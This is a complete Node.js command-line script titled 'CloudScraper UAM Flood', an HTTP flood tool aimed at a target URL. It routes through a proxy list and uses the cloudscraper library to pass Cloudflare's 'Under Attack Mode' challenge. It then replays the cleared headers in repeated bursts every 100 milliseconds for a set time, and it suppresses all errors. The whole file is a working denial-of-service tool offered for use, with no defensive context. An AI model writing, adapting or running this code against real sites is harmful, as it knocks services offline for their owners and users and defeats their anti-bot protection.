#!/usr/bin/env node
/* CloudScraper UAM Flood */

require('events').EventEmitter.defaultMaxListeners = 0;

const fs = require('fs');
const CloudScraper = require('cloudscraper');
const path = require('path');

if (process.argv.length < 6) {
    console.log(`Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip> <proxies.txt>`);
    process.exit(0);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
const reqPerIp = parseInt(process.argv[4]) || 10;

let proxies = fs.readFileSync(process.argv[5], 'utf-8');
proxies = proxies.replace(/\r/gi, '').split('\n').filter(Boolean);

function sendReq() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    
    CloudScraper({
        uri: target,
        resolveWithFullResponse: true,
        proxy: 'http://' + proxy,
        challengesToSolve: 10
    }, (error, response) => {
        if (error || !response) return;
        
        for (let i = 0; i < reqPerIp; i++) {
            CloudScraper({
                uri: target,
                headers: response.request.headers,
                proxy: 'http://' + proxy,
                followAllRedirects: false
            }, () => {});
        }
    });
}

setInterval(sendReq, 100);

setTimeout(() => {
    console.log('[+] Attack ended.');
    process.exit(0);
}, time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
